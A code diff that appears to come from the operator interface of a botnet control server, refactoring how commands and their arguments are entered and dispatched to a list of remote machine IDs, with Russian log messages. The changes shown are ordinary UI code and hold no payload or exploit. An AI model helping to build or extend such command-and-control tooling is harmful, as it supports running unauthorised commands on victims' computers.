@@ -28,7 +28,7 @@ namespace BotNet_Server_UI
 
         public bool ipsall;
         public string[] ips;
-        dynamic[] args = new dynamic[0];
+        List<UIElement> args = new List<UIElement>();
         string argtype = null;
         IP[] arr;
         public ulong TotalMem = new Memory().GetAllMemory();
@@ -157,19 +157,19 @@ namespace BotNet_Server_UI
                 }
                 string showcommand = Command.Text;
                 string command = Command.Text;
-                if (argtype == "TextBox")
+                foreach (var item in args)
                 {
-                    for (int i = 0; i < args.Length; i++)
+                    if (item is TextBox)
                     {
-                        showcommand += " " + args[i].Text;
-                        command += "^" + args[i].Text;
+                        showcommand += " " + (item as TextBox).Text;
+                        command += "^" + (item as TextBox).Text;
                     }
                 }
                 m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Заданная команда {command} / {showcommand}\r\n";
                 Message message = new Message()
                 {
                     command = command,
-                    ids = ipsall ? arr.Select(x => x.id.ToString()).ToArray() : ips
+                    ids = ipsall ? arr.Where(x => x.nameofpc != string.Empty).Select(x => x.id.ToString()).ToArray() : ips
                 };
                 m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Создан экземпляр Message: Команда {message.command} / ID {message.ids}\r\n";
                 m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow / Send_Command event) Отправлен ApiRequest.Create(message) на messages\r\n";
@@ -414,6 +414,7 @@ namespace BotNet_Server_UI
                 m3md2.StaticVariables.Diagnostics.ExceptionCount++;
             }
         }
+        bool isSendBlocked;
         private void Command_TextChanged(object sender, TextChangedEventArgs e)
         {
             try
@@ -423,40 +424,40 @@ namespace BotNet_Server_UI
                 {
                     if (Command.Text == Arguments.arguments[i].Command)
                     {
+                        if (Arguments.arguments[i].IsForServer)
+                        {
+                            SendButton.IsEnabled = false;
+                            Command.KeyDown -= Command_KeyDown;
+                            isSendBlocked = true;
+                        }
                         m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow CommandHelper) Команда {Command.Text} распознана\r\n";
-                        argtype = Arguments.arguments[i].ArgumentType;
                         m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow CommandHelper) Тип аргументов {argtype}\r\n";
-                        if (argtype == "TextBox")
-                        {
-                            args = new TextBox[Arguments.arguments[i].ArgumentCount];
-                        }
-                        else if (argtype == "Button")
-                        {
-                            args = new Button[Arguments.arguments[i].ArgumentCount];
-                        }
                         for (int j = 0, k = Arguments.arguments[i].ArgumentCount; j < Arguments.arguments[i].ArgumentCount; j++)
                         {
-                            if (Arguments.arguments[i].ArgumentType == "TextBox")
+                            if (Arguments.arguments[i].ArgumentType[j] == "TextBox")
                             {
-                                args[j] = new TextBox()
+                                args.Add(new TextBox()
                                 {
                                     Name = $"Argument{j + 1}",
                                     TextWrapping = TextWrapping.NoWrap,
                                     HorizontalAlignment = HorizontalAlignment.Stretch,
                                     Margin = new Thickness(10 + j * (270 / Arguments.arguments[i].ArgumentCount), 10, 10 + --k * (270 / Arguments.arguments[i].ArgumentCount), 18),
-                                };
-                                args[j].KeyDown += new KeyEventHandler(Command_KeyDown);
+                                });
+                                if (!Arguments.arguments[i].IsForServer)
+                                {
+                                    (args[j] as TextBox).KeyDown += new KeyEventHandler(Command_KeyDown);
+                                }
                             }
-                            else if (Arguments.arguments[i].ArgumentType == "Button")
+                            else if (Arguments.arguments[i].ArgumentType[j] == "Button")
                             {
-                                args[j] = new Button()
+                                args.Add(new Button()
                                 {
                                     Content = Arguments.arguments[i].ArgumentsList[j],
                                     HorizontalAlignment = HorizontalAlignment.Stretch,
                                     VerticalAlignment = VerticalAlignment.Bottom,
-                                    Margin = new Thickness(10, 10, 10, 18)
-                                };
-                                args[j].Click += new RoutedEventHandler(Button_Click1);
+                                    Margin = new Thickness(10 + j * (270 / Arguments.arguments[i].ArgumentCount), 10, 10 + --k * (270 / Arguments.arguments[i].ArgumentCount), 18)
+                                });
+                                (args[j] as Button).Click += new RoutedEventHandler(Button_Click1);
                             }
                             args[j].SetValue(Grid.ColumnProperty, 2);
                             args[j].SetValue(Grid.RowProperty, 2);
@@ -466,10 +467,17 @@ namespace BotNet_Server_UI
                         return;
                     }
                 }
-                for (int i = 0; i < args.Length; i++)
+                for (int i = 0; i < args.Count; i++)
                 {
-                    m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow CommandHelper) Удаляю {args[i]} так как команда была стерта\r\n";
+                    m3md2.StaticVariables.Diagnostics.ProgramInfo += $"{DateTime.Now.ToLongTimeString()}(MainWindow CommandHelper) Удаляю {args[i]} так как команда была стерта, а также стираю массив\r\n";
                     Grid.Children.Remove(args[i]);
+                }
+                args.Clear();
+                if (isSendBlocked)
+                {
+                    SendButton.IsEnabled = true;
+                    Command.KeyDown += Command_KeyDown;
+                    isSendBlocked = false;
                 }
             }
             catch (Exception ex)
